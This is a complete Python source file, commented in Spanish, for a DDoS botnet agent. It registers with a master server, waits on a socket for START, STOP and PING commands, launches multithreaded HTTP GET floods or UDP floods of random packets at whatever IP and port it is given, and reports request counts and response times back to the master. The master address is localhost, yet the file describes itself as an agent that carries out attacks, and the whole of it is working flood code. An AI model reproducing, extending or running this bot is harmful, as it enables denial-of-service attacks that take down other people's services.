# bot.py: agente que ejecuta ataques y reporta resultados
import socket
import threading
import requests
import random
import time

MASTER_IP = '127.0.0.1'
MASTER_COMMAND_PORT = 65432
MASTER_RESPONSE_PORT = 65433
BOT_PORT = 65440

stop_event = threading.Event()
attack_threads = []
response_lock = threading.Lock()

# Registrar bot con el master
def register():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((MASTER_IP, MASTER_COMMAND_PORT))
            s.sendall(b'REGISTER_BOT')
            print("[+] Bot registrado con Master")
    except Exception as e:
        print(f"[!] Error al registrar: {e}")

# Ejecutar ataque HTTP

def http_flood(target_ip, target_port, duration):
    url = f"http://{target_ip}:{target_port}/"
    end = time.time() + duration
    local_rts = []
    local_total = 0
    last_report = time.time()

    while not stop_event.is_set() and time.time() < end:
        try:
            start = time.time()
            r = requests.get(url, timeout=2)
            elapsed = (time.time() - start) * 1000
            local_rts.append(elapsed)
            local_total += 1
        except requests.RequestException:
            continue

        if time.time() - last_report >= 5:
            avg = sum(local_rts) / local_total if local_total else 0
            report_stats(local_total, avg, local_rts)
            last_report = time.time()
            local_rts = []
            local_total = 0

    # Final envío
    if local_total > 0:
        avg = sum(local_rts) / local_total
        report_stats(local_total, avg, local_rts)

# Ejecutar ataque UDP

def udp_flood(target_ip, target_port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(1024)
    end = time.time() + duration
    total = 0
    while not stop_event.is_set() and time.time() < end:
        try:
            sock.sendto(payload, (target_ip, int(target_port)))
            total += 1
        except:
            continue
    sock.close()
    report_stats(total, 0.0, [])

# Reportar estadísticas al master

def report_stats(total, avg, rts):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((MASTER_IP, MASTER_RESPONSE_PORT))
            rts_str = ' '.join(f"{rt:.2f}" for rt in rts)
            msg = f"RESPONSE_DATA TOTAL_REQUESTS {total} AVERAGE_RESPONSE_TIME {avg:.2f} RESPONSE_TIMES {rts_str}"
            s.sendall(msg.encode())
            print(f"[>] Estadísticas enviadas: {total} reqs, avg {avg:.2f} ms")
    except Exception as e:
        print(f"[!] Error enviando stats: {e}")
# Iniciar ataque con hilos

def start_attack(attack_type, ip, port, threads, duration):
    stop_event.clear()
    attack_threads.clear()
    for _ in range(int(threads)):
        t = threading.Thread(target=http_flood if attack_type == 'http' else udp_flood,
                             args=(ip, port, int(duration)), daemon=True)
        t.start()
        attack_threads.append(t)
    for t in attack_threads:
        t.join()

# Parar ataque
def stop_attack():
    stop_event.set()
    for t in attack_threads:
        t.join()

# Escuchar órdenes del master

def listen():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.bind(('0.0.0.0', BOT_PORT))
            s.listen()
            print(f"[*] Esperando comandos en {BOT_PORT}...")
            while True:
                conn, addr = s.accept()
                threading.Thread(target=handle_command, args=(conn,), daemon=True).start()
        except Exception as e:
            print(f"[!] Error escuchando comandos: {e}")

def handle_command(conn):
    with conn:
        try:
            data = conn.recv(1024).decode().strip()
            if data == 'PING':
                conn.sendall(b'PONG')
            elif data.startswith('START'):
                _, atk, ip, port, th, dur = data.split()
                threading.Thread(target=start_attack, args=(atk, ip, port, th, dur), daemon=True).start()
            elif data == 'STOP':
                stop_attack()
        except Exception as e:
            print(f"[!] Error comando: {e}")

if __name__ == '__main__':
    print("[+] Iniciando bot...")
    register()
    listen()
